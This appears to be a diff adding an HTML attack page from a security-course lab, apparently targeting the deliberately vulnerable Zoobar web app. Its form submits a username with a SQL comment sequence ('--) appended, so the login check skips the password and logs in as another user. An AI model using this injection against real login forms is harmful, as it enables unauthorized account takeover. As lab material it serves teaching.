@@ -1,0 +1,16 @@
+<html>
+<body>
+	<iframe name="frame" hidden></iframe>
+	<form method="POST" action="http://zoobar.org/index.php" target="_self">
+	Username: <input type="text" value="" name="login_username" id="username">
+	<input type="hidden" value="gibberish" name="login_password" id="password">
+	<input type="submit" value="Log in" name="submit_registration" id="btn" onclick="redirect()">
+	</form>
+	<script>
+	function redirect() {
+		document.getElementById("username").value += "'--" + new Date().getTime();
+		document.getElementById("password").value += new Date().getTime();
+	}
+	</script>
+</body>
+</html>
